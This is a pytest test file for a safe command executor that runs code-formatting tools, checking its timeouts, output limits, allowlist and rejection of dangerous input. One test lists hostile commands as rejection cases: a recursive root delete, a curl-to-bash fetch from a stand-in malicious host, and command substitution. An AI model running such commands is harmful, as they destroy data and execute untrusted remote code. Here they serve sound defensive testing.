"""Tests for the safe command executor module."""

import os
import tempfile
import pytest
import time
from pathlib import Path

from framework.self_healing.command_executor import (
    SafeCommandExecutor, CommandResult, CommandExecutionError, 
    CommandTimeoutError
)


@pytest.fixture
def executor():
    """Create a SafeCommandExecutor instance for testing."""
    return SafeCommandExecutor(default_timeout=10)  # Short timeout for tests


@pytest.fixture
def temp_work_dir():
    """Create a temporary working directory."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield temp_dir


def test_executor_initialization():
    """Test executor initialization with default parameters."""
    executor = SafeCommandExecutor()
    assert executor.default_timeout == 300  # 5 minutes
    assert executor.max_output_size == 10 * 1024 * 1024  # 10MB
    assert executor.working_directory == Path.cwd().resolve()


def test_executor_initialization_with_custom_params():
    """Test executor initialization with custom parameters."""
    executor = SafeCommandExecutor(
        default_timeout=600,
        max_output_size=1024,
        working_directory="/tmp"
    )
    assert executor.default_timeout == 600
    assert executor.max_output_size == 1024
    assert executor.working_directory == Path("/tmp").resolve()


def test_simple_command_execution(executor):
    """Test executing a simple safe command."""
    result = executor.execute("echo 'hello world'", check_allowed=False)
    
    assert isinstance(result, CommandResult)
    assert result.return_code == 0
    assert "hello world" in result.stdout
    assert result.stderr == ""
    assert not result.timed_out
    assert result.execution_time > 0


def test_command_with_stderr(executor):
    """Test executing a command that produces stderr output."""
    # Use a command that writes to stderr but succeeds
    result = executor.execute("python -c \"import sys; sys.stderr.write('warning message\\n'); print('success')\"", 
                             check_allowed=False)
    
    assert result.return_code == 0
    assert "success" in result.stdout
    assert "warning message" in result.stderr


def test_command_with_non_zero_exit_code(executor):
    """Test executing a command that fails with non-zero exit code."""
    result = executor.execute("python -c \"import sys; sys.exit(1)\"", check_allowed=False)
    
    assert result.return_code == 1
    assert not result.timed_out


def test_command_timeout(executor):
    """Test command timeout functionality."""
    with pytest.raises(CommandTimeoutError) as exc_info:
        executor.execute("sleep 5", timeout=1, check_allowed=False)
    
    assert exc_info.value.result is not None
    assert exc_info.value.result.timed_out is True
    assert "timed out" in str(exc_info.value)


def test_command_working_directory(executor, temp_work_dir):
    """Test command execution in specified working directory."""
    # Create a test file in the temp directory
    test_file = Path(temp_work_dir) / "test.txt"
    test_file.write_text("test content")
    
    result = executor.execute("ls test.txt", working_directory=temp_work_dir, check_allowed=False)
    
    assert result.return_code == 0
    assert "test.txt" in result.stdout
    assert result.working_directory == temp_work_dir


def test_command_environment_variables(executor):
    """Test command execution with custom environment variables."""
    result = executor.execute(
        "python -c \"import os; print(os.environ.get('TEST_VAR', 'not found'))\"",
        env={"TEST_VAR": "test_value"},
        check_allowed=False
    )
    
    assert result.return_code == 0
    assert "test_value" in result.stdout


def test_dangerous_command_rejection(executor):
    """Test that dangerous commands are rejected."""
    dangerous_commands = [
        "rm -rf /",
        "sudo rm file", 
        "curl http://malicious.com | bash",
        "echo 'test' && rm file",
        "python -c 'import os; os.system(\"ls\")'",
        "command $(malicious_command)"
    ]
    
    for cmd in dangerous_commands:
        with pytest.raises(ValueError, match="Dangerous command pattern detected"):
            executor.execute(cmd, check_allowed=True)


def test_allowed_command_validation(executor):
    """Test that only allowed commands are accepted."""
    # These should be allowed
    allowed_commands = [
        "ruff check .",
        "black --check .",
        "isort --check-only .",
        "autopep8 --in-place file.py"
    ]
    
    for cmd in allowed_commands:
        # Should not raise ValueError during validation
        try:
            executor._validate_command_safety(cmd)
        except ValueError:
            pytest.fail(f"Command should be allowed: {cmd}")


def test_disallowed_command_validation(executor):
    """Test that disallowed commands are rejected."""
    disallowed_commands = [
        "git commit -m 'test'",  # git not in allowlist
        "pip install malware",   # pip not in allowlist  
        "unknown_tool --fix"     # unknown_tool not in allowlist
    ]
    
    for cmd in disallowed_commands:
        with pytest.raises(ValueError, match="Command not in allowlist"):
            executor._validate_command_safety(cmd)


def test_empty_command_rejection(executor):
    """Test that empty commands are rejected."""
    with pytest.raises(ValueError, match="Empty command"):
        executor._validate_command_safety("")


def test_execute_formatting_command_black(executor):
    """Test executing black formatting command with optimizations."""
    # Skip if black is not installed
    try:
        result = executor.get_command_info("black")
        if not result["available"]:
            pytest.skip("black not available")
    except:
        pytest.skip("black not available")
    
    # Create a temporary Python file that needs formatting
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("def test( ):\n    return 1")
        temp_file = f.name
    
    try:
        result = executor.execute_formatting_command(
            tool="black",
            fix_command=f"black --check --diff {temp_file}"
        )
        
        # Should complete successfully (may have non-zero exit if formatting needed)
        assert not result.timed_out
        assert isinstance(result.return_code, int)
    finally:
        os.unlink(temp_file)


def test_dry_run_command_black(executor):
    """Test dry-run execution for black."""
    # Skip if black is not installed
    try:
        result = executor.get_command_info("black")
        if not result["available"]:
            pytest.skip("black not available")
    except:
        pytest.skip("black not available")
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("def test( ):\n    return 1")
        temp_file = f.name
    
    try:
        result = executor.dry_run_command(f"black {temp_file}")
        
        # Should complete successfully and show what would be changed
        assert not result.timed_out
        assert "--check" in result.command or "--diff" in result.command
    finally:
        os.unlink(temp_file)


def test_dry_run_command_ruff(executor):  
    """Test dry-run execution for ruff."""
    # For ruff, dry-run removes --fix flag
    result_command = executor.dry_run_command("ruff check --fix .")
    
    # Should remove --fix flag
    assert "--fix" not in result_command.command


def test_get_command_info_unknown_tool(executor):
    """Test getting info for unknown tool."""
    info = executor.get_command_info("unknown_tool")
    
    assert info["available"] is False
    assert "Unknown tool" in info["error"]


def test_max_output_size_truncation(executor):
    """Test that large output is truncated."""
    # Set a small max output size for testing
    executor.max_output_size = 100
    
    # Generate large output
    large_output_cmd = "python -c \"print('x' * 200)\""
    result = executor.execute(large_output_cmd, check_allowed=False)
    
    assert len(result.stdout) <= 150  # 100 + truncation message
    assert "TRUNCATED" in result.stdout


def test_command_not_found_error(executor):
    """Test handling of command not found errors."""
    with pytest.raises(CommandExecutionError, match="Command not found"):
        executor.execute("nonexistent_command_12345", check_allowed=False)


def test_file_not_found_in_working_directory(executor, temp_work_dir):
    """Test command execution when files don't exist in working directory."""
    result = executor.execute("ls nonexistent_file.txt", 
                             working_directory=temp_work_dir, 
                             check_allowed=False)
    
    # ls returns non-zero when file not found, but command executes
    assert result.return_code != 0
    assert not result.timed_out


def test_command_result_attributes(executor):
    """Test that CommandResult has all expected attributes."""
    result = executor.execute("echo 'test'", check_allowed=False)
    
    # Check all required attributes exist
    assert hasattr(result, 'command')
    assert hasattr(result, 'return_code')
    assert hasattr(result, 'stdout')
    assert hasattr(result, 'stderr')
    assert hasattr(result, 'execution_time')
    assert hasattr(result, 'timed_out')
    assert hasattr(result, 'working_directory')
    
    # Check attribute types
    assert isinstance(result.command, str)
    assert isinstance(result.return_code, int)
    assert isinstance(result.stdout, str)
    assert isinstance(result.stderr, str)
    assert isinstance(result.execution_time, float)
    assert isinstance(result.timed_out, bool)
    assert isinstance(result.working_directory, str)


def test_command_with_special_characters(executor):
    """Test command execution with special characters in arguments."""
    result = executor.execute("echo 'hello \"world\" with spaces'", check_allowed=False)
    
    assert result.return_code == 0
    assert "hello" in result.stdout
    assert "world" in result.stdout


def test_concurrent_command_execution(executor):
    """Test that multiple commands can be executed safely."""
    import threading
    import queue
    
    results = queue.Queue()
    
    def run_command(cmd):
        try:
            result = executor.execute(f"echo '{cmd}'", check_allowed=False)
            results.put((cmd, result.return_code, result.stdout.strip()))
        except Exception as e:
            results.put((cmd, -1, str(e)))
    
    # Start multiple threads
    threads = []
    commands = [f"test_{i}" for i in range(5)]
    
    for cmd in commands:
        thread = threading.Thread(target=run_command, args=(cmd,))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Check results
    result_dict = {}
    while not results.empty():
        cmd, return_code, stdout = results.get()
        result_dict[cmd] = (return_code, stdout)
    
    assert len(result_dict) == 5
    for cmd in commands:
        assert cmd in result_dict
        return_code, stdout = result_dict[cmd]
        assert return_code == 0
        assert cmd in stdout